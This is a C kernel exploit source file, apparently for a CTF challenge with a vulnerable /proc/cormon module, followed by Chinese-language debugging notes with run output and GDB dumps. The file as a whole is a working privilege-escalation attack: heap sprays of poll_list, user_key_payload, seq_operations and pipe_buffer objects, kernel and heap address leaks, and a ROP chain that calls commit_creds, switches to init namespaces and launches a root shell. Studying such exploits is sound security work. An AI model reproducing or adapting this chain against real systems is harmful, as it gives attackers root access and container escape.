// $ gcc -O3 -pthread -static -w -masm=intel ./exploit.c -o exploit -lkeyutils
#define _GNU_SOURCE

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <poll.h>
#include <pthread.h>
#include <keyutils.h>

#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>

#include <linux/rtnetlink.h>
#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/pfkeyv2.h>
#include <linux/xfrm.h>

#include <net/if.h>
#include <arpa/inet.h>

// #define DEBUG 1

#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define PAGE_SIZE 4096
#define MAX_KEYS 199
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16

#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);  // num of pollfd

pthread_t poll_tid[0x1000];     // threads of spraying `poll_list`
size_t poll_threads;            // num of threads
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;  // to increment poll_threads

uint64_t proc_single_show;
uint64_t target_object;         // the heap address of `tty_struct` in kmalloc-1024
uint64_t kernel_base;

int pipes[0x1000][2];   // spray `pipe_buffer` in kmalloc-1024
int seq_ops[0x10000];   // spray `seq_operations` in kmalloc-32
int ptmx[0x1000];       // spray `tty_file_private` in kmalloc-32
int fds[0x1000];        
int keys[0x1000];       // spray `user_key_payload`  in kmalloc-32
int corrupted_key;      // the index of the overwritten `user_key_payload`
int n_keys;             // num of `user_key_payload`
int fd;                 // vul module
int s;

struct t_args
{
    int id;
    int nfds;
    int timer;
    bool suspend;
};

struct rcu_head
{
    void *next;
    void *func;
};

struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};

struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+]status has been saved.");
}

bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}

bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}

void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}

int randint(int min, int max)
{
    return min + (rand() % (max - min));
}

void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)           // process ID
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)    // thread ID —— https://www.cnblogs.com/scaugsh/p/10193436.html
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}

void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}
// alloc_seq_ops() —— spray `seq_operations` in kmalloc-32
void alloc_seq_ops(int i)
{
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0)
    {
        perror("[X] spray_seq_ops()");
        exit(1);
    }
}
// alloc_key() —— spray `user_key_payload` in kmalloc-32
int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = {0};
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);
    sprintf(desc, "payload_%d", id);
    payload = buff ? buff : calloc(1, size);
    if (!buff)
        memset(payload, id, size);    

    key = add_key("user", desc, payload, size, -2);   // KEY_SPEC_PROCESS_KEYRING = -2
    if (key < 0)
	{
        printf("%d\n", id);
		perror("[X] add_key()");
		return -1;
	}
    	
    return key;
}
// alloc_poll_list() —— spray `poll_list`
void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    bool suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));
// prepare `pollfd` list
    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }
// spray at core 0
    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;                 // count num of spray threads
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);
// avoid noise on core 0
    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {   
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) {};
    }     
}
// create_poll_thread() —— create threads of alloc_poll_list()
void create_poll_thread(int id, size_t size, int timer, bool suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);    // actual num of pollfd (8 bytes)
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}
// join_poll_threads() —— free all `poll_list`
void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);            // ???? 这样
        open("/proc/self/stat", O_RDONLY);
    }
        
    poll_threads = 0;
}

char *get_key(int i, size_t size)
{
	char *data;

	data = calloc(1, size);
	keyctl_read(keys[i], data, size);

	return data;
}
// leak_kernel_pointer() —— leak `seq_operations->show`
int leak_kernel_pointer(void)
{
    uint64_t *leak;
    char *key;

    for (int i = 0; i < n_keys; i++)
    {
        key = get_key(i, 0x10000);
        leak = (uint64_t *)key;

        if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0xe80)   // should change
        {
            corrupted_key = i;
            proc_single_show = *leak;
            kernel_base = proc_single_show - 0x327e80;        //  ffffffff81327e80 t proc_single_show

            printf("[+] Corrupted key found: keys[%d]!\n", corrupted_key);
            printf("[+] Leaked proc_single_show address: 0x%llx\n", proc_single_show);
            printf("[+] Kernel base address: 0x%llx\n", kernel_base);
            
            return 0;
        }
    }
    return -1;
}

void free_key(int i)
{
	keyctl_revoke(keys[i]);
	keyctl_unlink(keys[i], -2);   // KEY_SPEC_PROCESS_KEYRING = -2
    n_keys--;
}
// free_all_keys() —— free all `user_key_payload`
void free_all_keys(bool skip_corrupted_key)
{
    int total = n_keys;
    for (int i = 0; i < total; i++)
    {   
        if (skip_corrupted_key && i == corrupted_key)
            continue;
        free_key(i);
    }
    sleep(1); // GC keys
}
// alloc_tty() —— spray `tty_file_private` in kmalloc-32
void alloc_tty(int i)
{
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (ptmx[i] < 0)
    {
        perror("[X] alloc_tty()");
        exit(1);
    }
}
// leak `tty_struct` heap address in kmalloc-1024
int leak_heap_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0x20000);
    leak = (uint64_t *)key;

    for (int i = 0; i < 0x20000/sizeof(uint64_t); i++)
    {
        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00)   // last byte is 0x00
        {   
            if (leak[i+2] == leak[i+3] && leak[i+2] != 0)           // ???????????????
            {
                target_object = leak[i];
                printf("[+] Leaked kmalloc-1024 object: 0x%llx\n", target_object);
                return 0;
            }
        }
    }
    return -1;
}

void free_seq_ops(int i)
{
    close(seq_ops[i]);
}

void free_tty(int i)
{
    close(ptmx[i]);
}
// alloc_pipe_buff() —— spray `pipe_buffer`
void alloc_pipe_buff(int i)
{
    if (pipe(pipes[i]) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    if (write(pipes[i][1], "XXXXX", 5) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

void release_pipe_buff(int i)
{
    if (close(pipes[i][0]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }

    if (close(pipes[i][1]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }
}

bool check_root()
{
	int fd;
    if ((fd = open("/etc/shadow", O_RDONLY)) < 0)
        return false;
        
    close(fd);
    return true;
}

void win(void)
{
    if (check_root())
    {
        puts("[+] We are Ro0ot!");
        char *args[] = { "/bin/bash", "-i", NULL};
        execve(args[0], args, NULL);
    }
}

int main(int argc, char **argv)
{   
    char data[0x1000] = {0};
    char key[32] = {0};
    uint64_t *rop;
    void *stack;
    char *buff;
// 0. initial
    assign_to_core(0);
    save_status();

    stack = mmap((void *)0xdead000, 0x10000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    fd = open("/proc/cormon", O_RDWR);
    if (fd < 0)
    {
        perror("[X] open()");
        return -1;
    }

    init_fd(0);         // ???? need "/etc/passwd"
// 1. leak kernel base
// 1-1. spray 2048 `seq_operations` in kmalloc-32
    puts("[1-1] spray 2048 `seq_operations` in kmalloc-32...");
    for (int i = 0; i < 2048; i++)
        alloc_seq_ops(i);
// 1-2. spray 72 `user_key_payload` in kmalloc-32
    puts("[1-2] spray 72 `user_key_payload` in kmalloc-32...");
    for (int i = 0; i < 72; i++)
    {   
        setxattr("/home/hi/lol.txt", "user.x", data, 32, XATTR_CREATE);   // ?????? need "/home/user/.bashrc"   make user_key_payload->rcu.next == NULL
        keys[i] = alloc_key(n_keys++, key, 32);
    }
// 1-3. spray 14 `poll_list` (kmalloc-4096 + kmalloc-32)
    assign_to_core(randint(1, 3));      // avoid noise in core 0 (during creating sub-threads)
    
    puts("[1-3] spray 14 `poll_list` (kmalloc-4096 + kmalloc-32)...");
    for (int i = 0; i < 14; i++)
        create_poll_thread(i, 4096 + 24, 3000, false);      // 3s

    assign_to_core(0);

    while (poll_threads != 14) {};     // wait for spaying
    usleep(250000);
// 1-4. spray another (199-72) `user_key_payload` in kmalloc-32
    puts("[1-4] spray another (199-72) `user_key_payload` in kmalloc-32...");
    for (int i = 72; i < MAX_KEYS; i++)
    {
        setxattr("/home/hi/lol.txt", "user.x", data, 32, XATTR_CREATE);
        keys[i] = alloc_key(n_keys++, key, 32);
    }
// 1-5. trigger off-by-one in kmalloc-4096 to overwrite poll_list->next
    puts("[1-5] trigger off-by-one in kmalloc-4096 to overwrite poll_list->next...");
    write(fd, data, PAGE_SIZE);
// 1-6. trigger arb free by free 14 `poll_list->next` -> actually a `user_key_payload`
    puts("[1-6] Triggering arbitrary free...");
    join_poll_threads();    // wait 3s for arb free
// 1-7. spray 128 `seq_operations->single_next` to overwrite `user_key_payload->datalen`
    puts("[1-7] spray 128 `seq_operations->single_next` to overwrite `user_key_payload->datalen`...");
    for (int i = 2048; i < 2048 + 128; i++)
        alloc_seq_ops(i);
// 1-8. leak kernel base (seq_operations->show)
    puts("[1-8] Leaking kernel pointer...");
    if (leak_kernel_pointer() < 0)
    {
        puts("[X] Kernel pointer leak failed, try again...");
        exit(1);
    }
// 2. leak heap address
// 2-1. free all `user_key_payload` except the overwriten one
    puts("[2-1] Freeing user keys...");
    free_all_keys(true);
// 2-2. spray 72 `tty_file_private` in kmalloc-32
    puts("[2-2] Spraying tty_file_private / tty_struct structures...");
    for (int i = 0; i < 72; i++)
        alloc_tty(i);
// 2-3. leak `tty_file_private->tty` (`tty_struct` in kmalloc-1024)
    puts("[2-3] Leaking heap pointer...");
    if (leak_heap_pointer(corrupted_key) < 0)
    {
        puts("[X] Heap pointer leak failed, try again...");
        exit(1);
    }
// 3. hijack contro-flow
// 3-1. free 128 `seq_operations` in kmalloc-32 to free the overlapped chunk (`seq_operations` & `user_key_payload`)
    puts("[3-1] Freeing 128 `seq_operations`...");
    for (int i = 2048; i < 2048 + 128; i++)
        free_seq_ops(i);
// 3-2. spray 192 `poll_list` in kmalloc-32 to take the overlapped chunk (`seq_operations` & `user_key_payload`)
    assign_to_core(randint(1, 3));

    puts("[3-2] spray 192 `poll_list` in kmalloc-32...");
    for (int i = 0; i < 192; i++)
        create_poll_thread(i, 24, 3000, true);

    assign_to_core(0);
    
    while (poll_threads != 192) { }; 
    usleep(250000);
// 3-3. free 1 `user_key_payload` to free the overlapped chunk (`seq_operations` & `user_key_payload`)
    puts("[3-3] free 1 `user_key_payload` to free the overlapped chunk (`seq_operations` & `user_key_payload`)...");
    free_key(corrupted_key);
    sleep(1); // GC key
// 3-4. spray 199 `user_key_payload` in kmalloc-32 to forge `poll_list->next`= target_object - 0x18
    puts("[3-4] spray 199 `user_key_payload` in kmalloc-32 to forge `poll_list->next`= target_object - 0x18...");
    *(uint64_t *)&data[0] = target_object - 0x18;

    for (int i = 0; i < MAX_KEYS; i++)
    {
        setxattr("/home/hi/lol.txt", "user.x", data, 32, XATTR_CREATE);
        keys[i] = alloc_key(n_keys++, key, 32);
    }
// 3-5. free 72 `tty_struct` in kmalloc-1024
    puts("[3-5] Freeing tty_struct structures...");
    for (int i = 0; i < 72; i++)
        free_tty(i);

    sleep(1); // GC TTYs
// 3-6. spray 1024 `pipe_buffer` in kmalloc-1024
    puts("[3-6] spray 1024 `pipe_buffer` in kmalloc-1024...");
    for (int i = 0; i < 1024; i++)
        alloc_pipe_buff(i);
// 3-7. trigger arb free by free 192 `poll_list->next` -> actually free `pipe_buffer`
    puts("[3-7] trigger arb free by free 192 `poll_list->next` -> actually free `pipe_buffer`...");
    while (poll_threads != 0) {};   // wait freeing `poll_list->next`
// 3-8. spray ROP chain
    buff = (char *)calloc(1, 1024);

    // Stack pivot
    *(uint64_t *)&buff[0x10] = target_object + 0x50;    // anon_pipe_buf_ops
    *(uint64_t *)&buff[0x58] = kernel_base + 0x598b12;  // pipe_buf_operations->release 0x8       0xffffffff81598b12 : push rsi ; jmp qword ptr [rsi + 0x39]
    *(uint64_t *)&buff[0x39] = kernel_base + 0x7a9;     // 0xffffffff810007a9 : pop rsp ; ret
    *(uint64_t *)&buff[0x00] = kernel_base + 0x3c85d8;  // 0xffffffff813c85d8 : add rsp, 0x78 ; ret

    // ROP
    rop = (uint64_t *)&buff[0x80];

    // creds = prepare_kernel_cred(0)
    *rop ++= kernel_base + 0x1648;  // 0xffffffff81001648 : pop rdi ; ret
    *rop ++= 0;                     // 0
    *rop ++= kernel_base + 0xec780; // ffffffff810ec780 T prepare_kernel_cred

    // commit_creds(creds)
    *rop ++= kernel_base + 0x1f52c; // 0xffffffff8101f52c : pop rcx ; ret
    *rop ++= 0;                     // 0
    *rop ++= kernel_base + 0xa1347b;// 0xffffffff81a1347b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret ----> rcx is copy length
    *rop ++= kernel_base + 0xec4d0; // ffffffff810ec4d0 T commit_creds

    // task = find_task_by_vpid(1)
    *rop ++= kernel_base + 0x1648;  // 0xffffffff81001648 : pop rdi ; ret
    *rop ++= 1;                     // pid
    *rop ++= kernel_base + 0xe5a50; // ffffffff810e5a50 T find_task_by_vpid

    // switch_task_namespaces(task, init_nsproxy)
    *rop ++= kernel_base + 0x1f52c; // 0xffffffff8101f52c : pop rcx ; ret
    *rop ++= 0;                     // 0
    *rop ++= kernel_base + 0xa1347b;// 0xffffffff81a1347b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret ----> rcx is copy length
    *rop ++= kernel_base + 0x521;   // 0xffffffff81000521 : pop rsi ; ret
    *rop ++= kernel_base + 0x145a760;        // 0xffffffff8245a760 <init_nsproxy>
    *rop ++= kernel_base + 0xeafa0; // ffffffff810eafa0 T switch_task_namespaces

    // new_fs = copy_fs_struct(init_fs)
    *rop ++= kernel_base + 0x1648;  // 0xffffffff81001648 : pop rdi ; ret
    *rop ++= kernel_base + 0x1589780;        // 0xffffffff82589780 <init_fs>
    *rop ++= kernel_base + 0x2e7970;// ffffffff812e7970 T copy_fs_struct
    *rop ++= kernel_base + 0x1685bf;// 0xffffffff811685bf : push rax ; pop rbx ; ret

    // current = find_task_by_vpid(getpid())
    *rop ++= kernel_base + 0x1648;  // 0xffffffff81001648 : pop rdi ; ret
    *rop ++= getpid();              // pid
    *rop ++= kernel_base + 0xe5a50; // ffffffff810e5a50 T find_task_by_vpid

    // current->fs = new_fs
    *rop ++= kernel_base + 0x1f52c; // 0xffffffff8101f52c : pop rcx ; ret
    *rop ++= 0x6e0;                 // current->fs         ??????????????
    *rop ++= kernel_base + 0x2394f; // 0xffffffff8102394f : add rax, rcx ; ret
    *rop ++= kernel_base + 0x7eac6d;// 0xffffffff817eac6d : mov qword ptr [rax], rbx ; pop rbx ; ret
    *rop ++= 0;                     // rbx

    // kpti trampoline
    *rop ++= kernel_base + 0xc00ef0 + 22; // ffffffff81c00ef0 T swapgs_restore_regs_and_return_to_usermode + 22
    *rop ++= 0;
    *rop ++= 0;
    *rop ++= (uint64_t)&win;
    *rop ++= user_cs;
    *rop ++= user_rflags;
    *rop ++= (uint64_t)(stack + 0x5000);
    *rop ++= user_ss;

    puts("[3-8-1] Freeing user keys...");
    free_all_keys(false);
    // spray 31 `user_key_payload` in kmalloc-1024
    puts("[3-8-2] Spraying ROP chain (spray 31 `user_key_payload` in kmalloc-1024)...");
    for (int i = 0; i < 31; i++)
        keys[i] = alloc_key(n_keys++, buff, 600);       // 之前任意释放的是 target_object-0x18, 布置数据也是从 `user_key_payload->data` (偏移0x18) 开始, 刚好从0开始伪造 pipe_buffer
// 3-9. trigger `pipe_buffer->ops->release()` to hijack control-flow
    puts("[3-9] trigger `pipe_buffer->ops->release()` to hijack control-flow...");
    for (int i = 0; i < 1024; i++)
        release_pipe_buff(i);

    for (int i = 0; i < 256; i++)
        pthread_join(poll_tid[i], NULL);
}

/*
(1) two address

(1-1) init_fs
https://elixir.bootlin.com/linux/v5.10.127/source/init/init_task.c#L115
gef➤  p init_task->fs
$2 = (struct fs_struct *) 0xffffffff82589780 <init_fs>

(1-2) init_nsproxy
https://elixir.bootlin.com/linux/v5.10.127/source/init/init_task.c#L122
gef➤  p init_task->nsproxy
$3 = (struct nsproxy *) 0xffffffff8245a760 <init_nsproxy>

(2)
问题1: 无法泄露内核基址
解决1: 原来是 is_kernel_pointer() 泄露时判断条件有误, 判断是否泄露成功时还判断了低2字节是否为 proc_single_show() 的地址, 忘记修改了

(3)
问题2: 最后要触发劫持 control-flow 时崩溃了

$ ./exploit
[+]status has been saved.
[1-1] spray 2048 `seq_operations` in kmalloc-32...
[1-2] spray 72 `user_key_payload` in kmalloc-32...
[1-3] spray 14 `poll_list` (kmalloc-4096 + kmalloc-32)...
[1-4] spray another (199-72) `user_key_payload` in kmalloc-32...
196
[X] add_key(): Disk quota exceeded
197
[X] add_key(): Disk quota exceeded
198
[X] add_key(): Disk quota exceeded
[1-5] trigger off-by-one in kmalloc-4096 to overwrite poll_list->next...
[1-6] Triggering arbitrary free...
[1-7] spray 128 `seq_operations->single_next` to overwrite `user_key_payload->datalen`...
[1-8] Leaking kernel pointer...
[+] Corrupted key found: keys[69]!
[+] Leaked proc_single_show address: 0xffffffff81327e80
[+] Kernel base address: 0xffffffff81000000
[2-1] Freeing user keys...
[2-2] Spraying tty_file_private / tty_struct structures...
[2-3] Leaking heap pointer...
[+] Leaked kmalloc-1024 object: 0xffff888006f83000
[3-1] Freeing 128 `seq_operations`...
[3-2] spray 192 `poll_list` in kmalloc-32...
[3-3] free 1 `user_key_payload` to free the overlapped chunk (`seq_operations` & `user_key_payload`)...
[3-4] spray 199 `user_key_payload` in kmalloc-32 to forge `poll_list->next`= target_object - 0x18...
196
[X] add_key(): Disk quota exceeded
197
[X] add_key(): Disk quota exceeded
198
[X] add_key(): Disk quota exceeded
[3-5] Freeing tty_struct structures...
[3-6] spray 1024 `pipe_buffer` in kmalloc-1024...
[3-7] trigger arb free by free 192 `poll_list->next` -> actually free `pipe_buffer`...
[3-8-1] Freeing user keys...
[3-8-2] Spraying ROP chain (spray 31 `user_key_payload` in kmalloc-1024)...
[3-9] trigger `pipe_buffer->ops->release()` to hijack control-flow...

下断点: 第1条ROP处断下来
    $ b *0xffffffff814cc72e

gef➤  x /50xg $rsi
0xffff888006f84400:	0xffffffff813c85d8	0x0000000000000000
0xffff888006f84410:	0x0000000000000000	0x0000000000000000
0xffff888006f84420:	0x0000000000000000	0x0000000000000000
0xffff888006f84430:	0x0000000000000000	0xffffffff814cc72e
0xffff888006f84440:	0x0000000000000000	0x0000000000000000
0xffff888006f84450:	0x0000000000000000	0x0000000000000000
0xffff888006f84460:	0x07a9000000000000	0x0000ffffffff8100
0xffff888006f84470:	0x0000000000000000	0x0000000000000000
0xffff888006f84480:	0xffffffff81001648	0x0000000000000000
0xffff888006f84490:	0xffffffff810ec780	0xffffffff8101f52c
0xffff888006f844a0:	0x0000000000000000	0xffffffff81a1347b
0xffff888006f844b0:	0xffffffff810ec4d0	0xffffffff81001648
0xffff888006f844c0:	0x0000000000000001	0xffffffff810e5a50
0xffff888006f844d0:	0xffffffff8101f52c	0x0000000000000000
0xffff888006f844e0:	0xffffffff81a1347b	0xffffffff81000521
0xffff888006f844f0:	0xffffffff8245a760	0xffffffff810eafa0
0xffff888006f84500:	0xffffffff81001648	0xffffffff82589780
0xffff888006f84510:	0xffffffff812e7970	0xffffffff811685bf
0xffff888006f84520:	0xffffffff81001648	0x0000000000000142
0xffff888006f84530:	0xffffffff810e5a50	0xffffffff8101f52c
0xffff888006f84540:	0x00000000000006e0	0xffffffff8102394f
0xffff888006f84550:	0xffffffff817eac6d	0x0000000000000000
0xffff888006f84560:	0xffffffff81c00f06	0x0000000000000000
0xffff888006f84570:	0x0000000000000000	0x0000000000402c7a
0xffff888006f84580:	0x0000000000000033	0x0000000000000246

发现是 pivot gadget 的问题, 找错了。

*/
